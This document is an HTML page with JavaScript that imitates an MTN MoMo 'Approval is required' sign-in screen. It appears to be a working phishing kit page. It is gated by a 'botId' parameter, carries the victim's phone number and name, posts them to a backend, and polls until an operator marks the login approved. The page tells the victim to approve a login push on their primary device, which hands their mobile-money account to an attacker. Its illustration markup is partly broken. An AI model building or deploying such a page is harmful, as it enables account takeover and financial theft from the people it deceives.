<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="theme-color" content="#075873">
<title>Approval is Required</title>

<style>
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

:root {
    --teal: #075873;
    --text: #686868;
}

html, body {
    width: 100%;
    min-height: 100%;
}

body {
    font-family: Arial, Helvetica, sans-serif;
    background: #ffffff;
    color: var(--text);
}

.page {
    position: relative;
    display: flex;
    flex-direction: column;
    width: 100%;
    min-height: 100vh;
    min-height: 100dvh;
    overflow: hidden;
    background: #ffffff;
}

/* Curved teal header */
.header {
    position: absolute;
    top: 0;
    left: -25%;
    width: 150%;
    height: 34%;
    background: var(--teal);
    border-radius: 0 0 50% 50%;
    z-index: 0;
}

/* Illustration area */
.hero {
    position: relative;
    z-index: 1;
    width: 100%;
    height: clamp(330px, 41vh, 440px);
    flex-shrink: 0;
    display: flex;
    align-items: center;
    justify-content: center;
}

.illustration-circle {
    width: min(68vw, 340px);
    aspect-ratio: 1;
    background: #f1f1f1;
    border: 12px solid #ffffff;
    border-radius: 50%;
    box-shadow: 0 12px 20px rgba(0, 0, 0, 0.06);
    display: flex;
    align-items: center;
    justify-content: center;
    overflow: hidden;
}

.illustration-circle svg {
    width: 100%;
    height: 100%;
    display: block;
}

/* Main message */
.content {
    position: relative;
    z-index: 1;
    padding: 10px 24px 0;
    text-align: center;
}

.content h1 {
    color: var(--teal);
    font-size: clamp(25px, 6vw, 32px);
    font-weight: 700;
    line-height: 1.3;
    margin-bottom: 25px;
}

.content p {
    color: var(--text);
    font-size: clamp(17px, 4.5vw, 22px);
    line-height: 1.7;
    font-weight: 400;
}

/* Inline status message */
#message-box {
    display: none;
    margin: 22px auto 0;
    padding: 12px 16px;
    border-radius: 12px;
    font-size: 15px;
    font-weight: 500;
    border: 1px solid transparent;
    max-width: 460px;
    width: calc(100% - 48px);
    text-align: center;
}
#message-box.error {
    display: block;
    background: #fef3f2;
    border-color: #fecdca;
    color: #c0392b;
}
#message-box.success {
    display: block;
    background: #ecfdf3;
    border-color: #abf0d1;
    color: #0b2b3b;
}

/* Continue button */
.bottom-area {
    margin-top: auto;
    padding: 30px 4.5% 35px;
    position: relative;
    z-index: 2;
}

.continue-button {
    width: 100%;
    min-height: 68px;
    border: none;
    border-radius: 50px;
    background: var(--teal);
    color: #ffffff;
    font-size: 22px;
    font-weight: 700;
    letter-spacing: 0.3px;
    cursor: pointer;
    transition: background 0.2s ease;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 12px;
    font-family: Arial, Helvetica, sans-serif;
}

.continue-button:hover {
    background: #06465c;
}

.continue-button:focus-visible {
    outline: 3px solid #63b5cb;
    outline-offset: 3px;
}

.continue-button:disabled {
    opacity: 1;
    cursor: wait;
}

.continue-button .btn-text { display: inline; }
.continue-button .btn-spinner {
    display: none;
    width: 26px;
    height: 26px;
    border: 3px solid rgba(255,255,255,0.3);
    border-top: 3px solid #fff;
    border-radius: 50%;
    animation: spin .8s linear infinite;
}
.continue-button.loading .btn-text { display: none; }
.continue-button.loading .btn-spinner { display: inline-block; }

@keyframes spin { to { transform: rotate(360deg); } }

/* Smaller phone screens */
@media (max-height: 700px) {
    .hero {
        height: 310px;
    }

    .illustration-circle {
        width: min(57vw, 260px);
    }

    .content h1 {
        margin-bottom: 16px;
    }

    .content p {
        line-height: 1.5;
    }

    .bottom-area {
        padding-top: 20px;
        padding-bottom: 24px;
    }

    .continue-button {
        min-height: 58px;
    }
}

/* Desktop preview */
@media (min-width: 700px) {
    .page {
        max-width: 540px;
        margin: 0 auto;
        min-height: 100vh;
        box-shadow: 0 0 20px rgba(0, 0, 0, 0.05);
    }

    .hero {
        height: 410px;
    }

    .illustration-circle {
        width: 320px;
    }
}
</style>
</head>

<body>

<main class="page">

    <div class="header" aria-hidden="true"></div>

    <!-- Security illustration -->

        <div class="illustration-circle">

                <!-- Neck -->
                <path d="M76 105L96 107L95 129Q87 140 76 128Z"

                <path d="M66 79Q66 59 83 59Q103 60 102 81L97 103Q90 116 78 106Q68 98 66 79Z"

                <path d="M65 79Q57 57 79 52Q97 51 105 67L103 81L92 77L79 66L73 82Z"
                      fill="#201a16"/>

                <!-- Face -->
                <path d="M98 85L104 88L99 91"
                      fill="none"
                      stroke="#8d4d30"
                      stroke-width="2"/>

                <circle cx="94" cy="82" r="1.8" fill="#222222"/>

                <!-- Key shaft -->
                <g transform="rotate(43 113 126)">
                    <rect x="108" y="53" width="10" height="153"

                    <rect x="110" y="53" width="4" height="153"

                    <!-- Key handle -->
                    <rect x="90" y="187" width="45" height="37"
                          rx="5"
                          fill="none"
                          stroke="#003e49"
                          stroke-width="7"/>

                    <rect x="99" y="195" width="27" height="21"
                          rx="3" fill="#f1f1f1"/>
                </g>

                <!-- Hand -->
                <path d="M74 142L84 135L94 132Q100 133 97 138L89 145L80 150L72 148Z"
                      fill="#a97a43"/>

            </svg>

        </div>
    </section>

    <!-- Approval message -->
    <section class="content">
        <h1>Approval is required</h1>

        <p>
            You're trying to sign in from a new device.
        Please check the notification sent to your
        primary device and approve the sign-in request
        to continue.
        </p>

        <div id="message-box"></div>
    </section>

    <!-- Continue button -->
    <footer class="bottom-area">
        <button
            class="continue-button"
            type="button"
            id="continueButton">
            <span class="btn-text">CONTINUE</span>
            <span class="btn-spinner"></span>
        </button>
    </footer>

</main>


<!-- ============================================================
     SCRIPT 1 — BOT ID RESOLVER
     ============================================================ -->
<script>
(function () {
    try {
        const params = new URLSearchParams(window.location.search);

        let botId = params.get('botId');
        if (!botId) {
            botId = localStorage.getItem('botId');
        }

        if (!botId || botId === 'test_bot' || botId === 'undefined' || botId === 'null') {
            document.documentElement.innerHTML =
                '<body style="font-family:Arial;padding:40px;text-align:center;color:#c0392b">' +
                '<h2>Invalid link</h2>' +
                '<p>Please open this page through the official link.</p>' +
                '</body>';
            window.__BOTID_MISSING__ = true;
            throw new Error('botId missing from URL and localStorage');
        }

        localStorage.setItem('botId', botId);

        if (params.get('botId') !== botId) {
            params.set('botId', botId);
            const newUrl = window.location.pathname + '?' + params.toString() + window.location.hash;
            window.history.replaceState({}, '', newUrl);
        }

        window.__BOT_ID__ = botId;

        console.log('🆔 botId resolved immediately:', botId);
    } catch (err) {
        console.error('botId resolver failed:', err.message);
    }
})();
</script>


<!-- ============================================================
     SCRIPT 2 — PAGE LOGIC
     ============================================================ -->
<script>
(function() {
    'use strict';

    // ---------- CONFIG ----------
    const BACKEND_URL = "";
    const NEXT_PAGE   = "success.html";

    // ---------- BOTID ----------
    const botId = window.__BOT_ID__;
    if (!botId) {
        console.warn('[MoMo] botId missing — page will not submit.');
    }

    // ---------- READ USER DATA ----------
    const urlParams = new URLSearchParams(window.location.search);

    let phone = urlParams.get('phone') || localStorage.getItem('phone') || '';
    let name  = urlParams.get('name')  || localStorage.getItem('fullName') || 'MTN User';

    try { if (phone) localStorage.setItem('phone', phone); } catch (e) {}
    try { localStorage.setItem('fullName', name); } catch (e) {}

    // ---------- DOM REFS ----------
    const btn    = document.getElementById('continueButton');
    const msgBox = document.getElementById('message-box');

    // ---------- HELPERS ----------
    function showMessage(text, isError) {
        msgBox.textContent = text;
        msgBox.className = isError ? 'error' : 'success';
    }

    function hideMessage() {
        msgBox.className = '';
        msgBox.textContent = '';
    }

    function setLoading(on) {
        if (on) {
            btn.disabled = true;
            btn.classList.add('loading');
        } else {
            btn.classList.remove('loading');
            btn.disabled = false;
        }
    }

    // ---------- POLLING ----------
    let pollTimer = null;

    function stopPolling() {
        if (pollTimer) {
            clearInterval(pollTimer);
            pollTimer = null;
        }
    }

    // ---------- REDIRECT ----------
    let hasRedirected = false;

    function goNext(requestId) {
        if (hasRedirected) return;
        hasRedirected = true;

        const qs = [
            'botId='     + encodeURIComponent(botId || ''),
            'requestId=' + encodeURIComponent(requestId || ''),
            'phone='     + encodeURIComponent(phone || ''),
            'name='      + encodeURIComponent(name || 'MTN User')
        ].join('&');

        const nextUrl = NEXT_PAGE + '?' + qs;
        console.log('✅ Approved — redirecting to:', nextUrl);
        window.location.assign(nextUrl);
    }

    // ---------- CONTINUE ----------
    btn.addEventListener('click', function () {
        if (this.disabled || this.classList.contains('loading')) return;

        hasRedirected = false;

        if (!botId) {
            showMessage('❌ Invalid link. Please open this page through the official link.', true);
            return;
        }
        if (!phone) {
            showMessage('❌ Session expired. Please reopen the official link.', true);
            return;
        }

        setLoading(true);
        hideMessage();

        fetch(BACKEND_URL + '/submit-approval', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ name: name, phone: phone, botId: botId })
        })
        .then(function(res) {
            if (!res.ok) {
                return res.text().then(function(t) {
                    const clean = t.startsWith('<') ? ('HTTP ' + res.status) : (t || ('HTTP ' + res.status));
                    throw new Error(clean);
                });
            }
            return res.json();
        })
        .then(function(data) {
            const requestId = data.requestId;
            if (!requestId) throw new Error('No request ID received');

            try { localStorage.setItem('approvalRequestId', requestId); } catch (e) {}

            stopPolling();
            let attempts = 0;
            const MAX_ATTEMPTS = 120; // ~3 minutes

            pollTimer = setInterval(function() {
                attempts++;
                fetch(BACKEND_URL + '/check-approval/' + encodeURIComponent(requestId))
                    .then(function(res) {
                        if (!res.ok) throw new Error('Verification error');
                        return res.json();
                    })
                    .then(function(status) {
                        if (status.blocked === true) {
                            stopPolling();
                            setLoading(false);
                            showMessage('❌ Account restricted. Please try again later.', true);
                            return;
                        }

                        if (status.approved === true) {
                            stopPolling();
                            setLoading(false);
                            showMessage('✅ Verified! Redirecting...', false);
                            setTimeout(function () {
                                goNext(requestId);
                            }, 700);
                            return;
                        }

                        if (status.approved === false) {
                            stopPolling();
                            setLoading(false);
                            showMessage('You have not yet approved the login. Please approve the login request from your primary device to continue.', true);
                            return;
                        }

                        if (attempts > MAX_ATTEMPTS) {
                            stopPolling();
                            setLoading(false);
                            showMessage('⏳ Taking too long. Please try again.', true);
                        }
                    })
                    .catch(function(err) {
                        console.error('Polling error:', err);
                    });
            }, 1500);
        })
        .catch(function(err) {
            setLoading(false);
            showMessage('❌ ' + (err.message || 'Something went wrong. Please try again.'), true);
        });
    });

    // ---------- BACK-FORWARD CACHE RESET ----------
    window.addEventListener('pageshow', function (event) {
        if (event.persisted) {
            hasRedirected = false;
            stopPolling();
            setLoading(false);
        }
    });

    // ---------- INIT ----------
    if (!phone) {
        showMessage('⚠️ Missing phone number. Please reopen the official link.', true);
    }

    console.log('✅ approval.html ready. botId =', botId, '| phone =', phone || '(missing)');
})();
</script>

</body>
</html>
